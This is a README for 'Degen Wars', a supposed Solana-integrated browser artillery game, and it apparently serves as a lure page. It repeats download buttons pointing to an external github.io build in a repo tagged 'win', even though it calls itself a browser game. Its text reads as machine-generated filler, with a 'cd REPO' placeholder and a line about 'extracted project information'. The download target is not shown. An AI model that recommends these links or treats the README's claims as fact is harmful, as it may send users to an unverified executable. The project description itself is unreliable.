# Degen Wars - Browser Artillery Game 2026

> **Degen Wars is a turn-based artillery game for web browsers with Solana integration, combining TypeScript and React gameplay components with Rust and Anchor programs.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser%20with%20Solana-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/svenbraun1968/degen-wars-win-55777?style=flat-square)](https://github.com/svenbraun1968/degen-wars-win-55777)

---

<p align="center">
  <a href="https://svenbraun1968.github.io/degen-wars-win-55777/">
    <img src="https://img.shields.io/badge/Download-Degen%20Wars%20Latest-brightgreen?style=for-the-badge" alt="Download Degen Wars">
  </a>
</p>

> **[Direct Download - Degen Wars](https://svenbraun1968.github.io/degen-wars-win-55777/)**

---

[Download Latest Build](https://svenbraun1968.github.io/degen-wars-win-55777/)

---

## About Degen Wars

Degen Wars is a browser-based artillery game built around turn-based combat. Players interact with game-state and statistics components through a web interface, while the project uses TypeScript and React for its application layer.

The project also explores Web3 game infrastructure on Solana. Its architecture includes Rust and Anchor programs, SPL Token support, token metadata, and treasury accounts, with player accounts, digital collectibles, and a marketplace identified as planned areas of development.

---

## Features

- Turn-based artillery battles played in a web browser
- Game-state components for managing match activity
- Player statistics and related gameplay data
- TypeScript and React application components
- Rust programs structured with Anchor
- Solana and SPL Token integration
- Token metadata and treasury account support
- Planned player accounts, digital collectibles, and marketplace functionality

---

## Installation

Clone the repository and move into the project directory:

```bash
git clone https://github.com/svenbraun1968/degen-wars-win-55777.git
cd REPO
```

Install the project dependencies using the package manager defined by the repository:

```bash
npm install
```

Start the local development application:

```bash
npm run dev
```

Open the local URL shown in the terminal in a supported web browser. If the repository provides separate Solana or Anchor commands, follow those project-specific scripts before testing blockchain-connected features.

---

## Usage

1. Open the published build or start the application locally.
2. Connect the required Solana wallet when prompted by the application.
3. Enter a turn-based artillery match.
4. Review available game-state and player-statistics information.
5. Test token-related functionality where the corresponding Solana programs and accounts are configured.
6. Use the browser developer console and project logs to inspect local development behavior.

For program development, use the repository's Anchor workflow to build, test, and deploy the Rust programs to the intended Solana environment.

---

## Configuration

Application settings are managed through the project's frontend and Solana environment configuration. When environment files are provided, create a local copy of the repository's example file and set values for the selected network, program identifiers, treasury accounts, and token metadata.

A typical local configuration may look like this:

```env
VITE_SOLANA_NETWORK=devnet
VITE_RPC_URL=<solana-rpc-endpoint>
VITE_PROGRAM_ID=<anchor-program-id>
VITE_TREASURY_ACCOUNT=<treasury-account>
```

Use the variable names supplied by the repository rather than adding unsupported settings. Keep wallet, account, and deployment values specific to the environment being tested.

---

## Requirements

- A modern web browser
- Internet access for browser-hosted builds and Solana connectivity
- Node.js and npm for local frontend development
- TypeScript and React tooling supplied by the project
- Rust and Anchor for Solana program development
- A Solana-compatible wallet for wallet-connected features
- Access to the selected Solana network and RPC endpoint
- Sufficient local storage for repository dependencies and build artifacts

---

## FAQ

### Is Degen Wars a browser game?

Yes. Degen Wars is designed to run in a web browser and provides turn-based artillery gameplay through its web application.

### Does it use Solana?

The project includes Solana-related functionality, including SPL Token integration, token metadata, treasury accounts, and Anchor-based Rust program architecture.

### Which version is available?

The extracted project information does not specify a numbered release version. Refer to the published build and repository history for the latest available state.

### How do I update the local copy?

Pull the newest repository changes, reinstall dependencies when package definitions change, and restart the development server:

```bash
git pull
npm install
npm run dev
```

### Why are blockchain features not working locally?

Check that the configured Solana network, RPC endpoint, program identifiers, treasury accounts, token metadata, and wallet connection match the environment being used. Also verify that the required Anchor programs have been built and deployed for that network.

### Where can I report a problem?

Use the repository's GitHub issue tracker and include the browser, operating environment, relevant configuration context, reproduction steps, and any applicable console or program logs.

---

## Roadmap

The project profile identifies the following planned areas:

- Player account support
- Digital collectibles
- Marketplace functionality
- Continued Solana game-system integration

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
